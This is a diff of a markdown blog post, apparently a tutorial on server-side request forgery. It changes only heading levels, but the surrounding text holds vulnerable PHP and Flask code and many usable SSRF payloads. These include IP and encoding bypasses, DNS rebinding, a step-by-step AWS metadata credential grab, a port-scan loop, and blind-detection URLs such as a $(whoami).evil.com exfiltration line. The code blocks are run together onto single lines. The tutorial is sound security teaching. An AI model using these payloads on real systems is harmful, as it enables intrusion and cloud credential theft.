@@ -6,7 +6,7 @@ tags: ["ssrf", "web-security"]
 readTime: "8 min read"
 ---
 
-### **SSRF: When Your Server Becomes a Nosy Hacker — Part 1** 🔍
+## **SSRF: When Your Server Becomes a Nosy Hacker — Part 1** 🔍
 
 ![](https://cdn-images-1.medium.com/max/800/0*YgnhrfUqF8q6gYnE)
 
@@ -34,15 +34,15 @@ And Bob, bless his trusting soul, says: **“Sure, buddy! Anything for a user!�
 
 * * *
 
-### What Is SSRF, Really?
+## What Is SSRF, Really?
 
 **Server-Side Request Forgery (SSRF)** is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker’s choosing.
 
-### Technical Definition:
+## Technical Definition:
 
 SSRF occurs when a web application accepts a user-supplied URL and retrieves the contents of this URL, but does not validate it against an allowlist of permitted domains or IP addresses.
 
-### The Attack Vector:
+## The Attack Vector:
 
 The attacker leverages the server’s network position and privileges to:
 
@@ -54,7 +54,7 @@ The attacker leverages the server’s network position and privileges to:
 
 * * *
 
-### Funny Analogy: Bob the Backend and the Forbidden Fridge 🤡
+## Funny Analogy: Bob the Backend and the Forbidden Fridge 🤡
 
 **Bob**: “I’m just a backend doing my job.”
 
@@ -68,9 +68,9 @@ The attacker leverages the server’s network position and privileges to:
 
 * * *
 
-### Real Exploit Flow 🔥
+## Real Exploit Flow 🔥
 
-#### 1\. Vulnerable Endpoint Discovery
+### 1\. Vulnerable Endpoint Discovery
 
 ```
 // Vulnerable PHP code example<?phpif (isset($_GET['url'])) {    $url = $_GET['url'];    $content = file_get_contents($url);  // VULNERABLE!    echo $content;}?>
@@ -79,7 +79,7 @@ The attacker leverages the server’s network position and privileges to:
 # Vulnerable Python Flask example@app.route('/fetch')def fetch_url():    url = request.args.get('url')    response = requests.get(url)  # VULNERABLE!    return response.text
 ```
 
-#### 2\. Attack Vectors and Payloads
+### 2\. Attack Vectors and Payloads
 
 A. Internal Network Reconnaissance
 
@@ -107,9 +107,9 @@ B. Cloud Metadata Exploitation
 
 * * *
 
-### Basic SSRF Exploitation Techniques 🛠️
+## Basic SSRF Exploitation Techniques 🛠️
 
-#### 1\. Simple IP Address Bypasses
+### 1\. Simple IP Address Bypasses
 
 A. Alternative IP Representations
 
@@ -123,13 +123,13 @@ B. DNS Rebinding Attacks
 # Using services like nip.iohttp://target.com/fetch?url=http://127.0.0.1.nip.io/http://target.com/fetch?url=http://localhost.127.0.0.1.nip.io/# Custom DNS records pointing to internal IPshttp://target.com/fetch?url=http://internal.evil.com/  # Resolves to 127.0.0.1
 ```
 
-#### **2\. URL Encoding and Obfuscation**
+### **2\. URL Encoding and Obfuscation**
 
 ```
 # Single URL encodinghttp://target.com/fetch?url=http%3A%2F%2F127.0.0.1%2F# Double URL encodinghttp://target.com/fetch?url=http%253A%252F%252F127.0.0.1%252F# Unicode encodinghttp://target.com/fetch?url=http://①②⑦.⓪.⓪.①/# Using redirects to bypass filtershttp://target.com/fetch?url=http://evil.com/redirect.php?to=127.0.0.1
 ```
 
-#### **3\. Protocol Exploitation**
+### **3\. Protocol Exploitation**
 
 A. HTTP/HTTPS Variations
 
@@ -145,21 +145,21 @@ B. File Protocol
 
 * * *
 
-### 🎯 High-Impact SSRF Attack Scenarios
+## 🎯 High-Impact SSRF Attack Scenarios
 
-#### **1\. AWS EC2 Instance Metadata Exploitation**
+### **1\. AWS EC2 Instance Metadata Exploitation**
 
 ```
 # Step 1: Check if metadata service is accessiblehttp://target.com/fetch?url=http://169.254.169.254/# Step 2: Get instance metadatahttp://target.com/fetch?url=http://169.254.169.254/latest/meta-data/# Step 3: Enumerate IAM roleshttp://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/# Step 4: Get IAM role name (example: WebServerRole)http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole# Step 5: Extract AWS credentials from response{  "Code" : "Success",  "LastUpdated" : "2024-01-15T10:30:00Z",  "Type" : "AWS-HMAC",  "AccessKeyId" : "ASIA...",  "SecretAccessKey" : "...",  "Token" : "...",  "Expiration" : "2024-01-15T16:30:00Z"}
 ```
 
-#### **2\. Internal Service Discovery**
+### **2\. Internal Service Discovery**
 
 ```
 # Common internal service portsPORTS=(22 23 25 53 80 110 143 443 993 995 1433 3306 3389 5432 5984 6379 8080 8443 9200 27017)# Automated scanning script conceptfor PORT in "${PORTS[@]}"; do    echo "Testing port $PORT..."    curl "http://target.com/fetch?url=http://127.0.0.1:$PORT"    curl "http://target.com/fetch?url=http://localhost:$PORT"    curl "http://target.com/fetch?url=http://0.0.0.0:$PORT"done
 ```
 
-#### **3\. Database Access Through SSRF**
+### **3\. Database Access Through SSRF**
 
 ```
 # MySQL (default port 3306)http://target.com/fetch?url=http://127.0.0.1:3306/# PostgreSQL (default port 5432)http://target.com/fetch?url=http://127.0.0.1:5432/# MongoDB (default port 27017)http://target.com/fetch?url=http://127.0.0.1:27017/# Redis (default port 6379)http://target.com/fetch?url=http://127.0.0.1:6379/# CouchDB (default port 5984)http://target.com/fetch?url=http://127.0.0.1:5984/_all_dbs
@@ -167,21 +167,21 @@ B. File Protocol
 
 * * *
 
-### Blind SSRF Detection 🎪
+## Blind SSRF Detection 🎪
 
-#### 1\. DNS-Based Detection
+### 1\. DNS-Based Detection
 
 ```
 # Using Burp Collaboratorhttp://target.com/fetch?url=http://abc123.burpcollaborator.net/# Using custom DNS serverhttp://target.com/fetch?url=http://ssrf-test.evil.com/# DNS exfiltrationhttp://target.com/fetch?url=http://$(whoami).evil.com/
 ```
 
-#### **2\. HTTP-Based Detection**
+### **2\. HTTP-Based Detection**
 
 ```
 # Using HTTP callbackshttp://target.com/fetch?url=http://requestbin.net/r/abc123# Using webhook.sitehttp://target.com/fetch?url=https://webhook.site/unique-id# Time-based detectionhttp://target.com/fetch?url=http://httpbin.org/delay/10
 ```
 
-#### **3\. Error-Based Detection**
+### **3\. Error-Based Detection**
 
 ```
 # Connection timeout (closed port)http://target.com/fetch?url=http://127.0.0.1:12345/# Connection refusedhttp://target.com/fetch?url=http://192.168.1.1:22/# DNS resolution failurehttp://target.com/fetch?url=http://nonexistent-domain-12345.com/
@@ -189,23 +189,23 @@ B. File Protocol
 
 * * *
 
-### Real-World Impact Examples 📊
+## Real-World Impact Examples 📊
 
-#### 1\. Capital One Data Breach (2019)
+### 1\. Capital One Data Breach (2019)
 
 -   **Attack Vector**: SSRF against AWS EC2 metadata service
 -   **Impact**: 100+ million customer records compromised
 -   **Technique**: Exploited web application firewall to access EC2 metadata
 -   **Lesson**: Always restrict access to cloud metadata services
 
-#### 2\. Shopify SSRF (2017)
+### 2\. Shopify SSRF (2017)
 
 -   **Bounty Paid**: $25,000
 -   **Attack Vector**: Internal GraphQL endpoint access
 -   **Impact**: Internal service enumeration and sensitive data access
 -   **Technique**: Bypassed IP restrictions using DNS rebinding
 
-#### 3\. Uber SSRF (2016)
+### 3\. Uber SSRF (2016)
 
 -   **Bounty Paid**: $8,000
 -   **Attack Vector**: Internal admin panel access
@@ -214,7 +214,7 @@ B. File Protocol
 
 * * *
 
-### 🎬 Part 1 Conclusion: Bob’s First Lesson
+## 🎬 Part 1 Conclusion: Bob’s First Lesson
 
 ![](https://cdn-images-1.medium.com/max/800/0*-hG19yLhOTRUyHI5.gif)
 
